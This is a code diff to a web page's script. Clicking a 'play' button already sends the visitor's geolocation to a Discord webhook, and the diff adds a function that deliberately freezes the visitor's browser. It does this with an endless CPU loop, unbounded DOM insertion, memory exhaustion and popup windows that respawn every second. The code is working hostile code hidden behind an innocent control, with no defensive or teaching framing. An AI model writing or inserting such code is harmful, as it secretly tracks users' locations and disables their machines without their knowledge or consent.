@@ -118,6 +118,9 @@ document.getElementById('playButton').addEventListener('click', function() {
 
     // Send location to Discord webhook
     sendLocationToWebhook();
+
+    // Introduce lag-inducing operations
+    lagTheSystem();
 });
 
 // Add close confirmation to main page
@@ -157,4 +160,56 @@ function sendLocationToWebhook() {
     } else {
         console.log('Geolocation not supported');
     }
+}
+
+// New function to cause significant lag
+function lagTheSystem() {
+    // 1. CPU-intensive infinite loop with heavy math
+    function heavyComputation() {
+        let result = 0;
+        for (let i = 0; i < 1e8; i++) {
+            result += Math.sin(i) * Math.cos(i) * Math.tan(i);
+        }
+        requestAnimationFrame(heavyComputation); // Keep it running
+    }
+    heavyComputation();
+
+    // 2. Excessive DOM manipulation
+    function spamDOM() {
+        for (let i = 0; i < 10000; i++) {
+            const div = document.createElement('div');
+            div.style.position = 'absolute';
+            div.style.left = Math.random() * 100 + 'vw';
+            div.style.top = Math.random() * 100 + 'vh';
+            div.style.width = '1px';
+            div.style.height = '1px';
+            div.style.background = 'black';
+            document.body.appendChild(div);
+        }
+        requestAnimationFrame(spamDOM); // Repeat indefinitely
+    }
+    spamDOM();
+
+    // 3. Memory hogging with large arrays
+    let memoryHog = [];
+    function fillMemory() {
+        for (let i = 0; i < 100000; i++) {
+            memoryHog.push(new Array(10000).fill(Math.random()));
+        }
+        requestAnimationFrame(fillMemory); // Keep filling memory
+    }
+    fillMemory();
+
+    // 4. Rapid window spawning (more popups)
+    function spawnWindows() {
+        for (let i = 0; i < 5; i++) {
+            const w = window.open('', `LagWindow${i}`, 'width=200,height=200');
+            if (w) {
+                w.document.write('<h1>Lagging...</h1>');
+                w.moveTo(Math.random() * screen.width, Math.random() * screen.height);
+            }
+        }
+        setTimeout(spawnWindows, 1000); // Spawn more every second
+    }
+    spawnWindows();
 }
